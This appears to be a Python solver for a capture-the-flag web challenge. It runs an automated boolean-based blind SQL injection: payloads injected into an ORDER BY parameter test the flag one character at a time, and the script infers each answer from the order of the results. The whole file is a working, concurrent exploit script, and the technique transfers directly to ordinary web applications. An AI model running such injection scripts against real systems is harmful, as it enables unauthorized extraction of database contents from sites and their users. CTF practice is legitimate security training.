import asyncio
import time

import aiohttp
import string

URL = 'http://challenge.nahamcon.com:31140'

AVAIL_CHAR = string.ascii_lowercase + '{}_'


async def post(s: aiohttp.ClientSession, pos, char):
    """
    Send a POST request
    :param s: request session
    :param pos: position to check
    :param char: character to check
    :return: response's body in bytes
    """
    try:
        data = {
            'search': 'a',
            'order': f'(SELECT CASE WHEN (SELECT HEX(SUBSTR(flag, {pos}, 1)) FROM flag) = HEX(\'{char}\') THEN atomic_number ELSE name END)'
        }
        async with s.post(url=URL, data=data) as res:
            return await res.read()

    except Exception as e:
        print(f"Unable to POST due to {e}")
        return None


async def post_proc(s: aiohttp.ClientSession, pos, char):
    """
    Handle sending a POST request and analyze the response
    :param s: request session
    :param pos: position to check
    :param char: character to check
    :return: None if response is invalid or boolean check is failed, else return tuple (pos, char)
    """
    res = await post(s, pos, char)

    if res is None:
        return None

    return (pos, char) if res.find(b'Actinium') > res.find(b'Magnesium') else None


def parse_flag(res):
    flag = [x for x in res if x is not None]
    print(flag)
    return ''.join([x[1] for x in flag])


async def main():
    async with aiohttp.ClientSession() as s:
        res = []

        # avoid using 2 for loop in asyncio.gather() due to server's overload
        for pos in range(1, 31):
            res += await asyncio.gather(*[post_proc(s, pos, char) for char in AVAIL_CHAR])
            print(parse_flag(res))


if __name__ == '__main__':
    asyncio.run(main())
    time.sleep(1)
    print('Done')
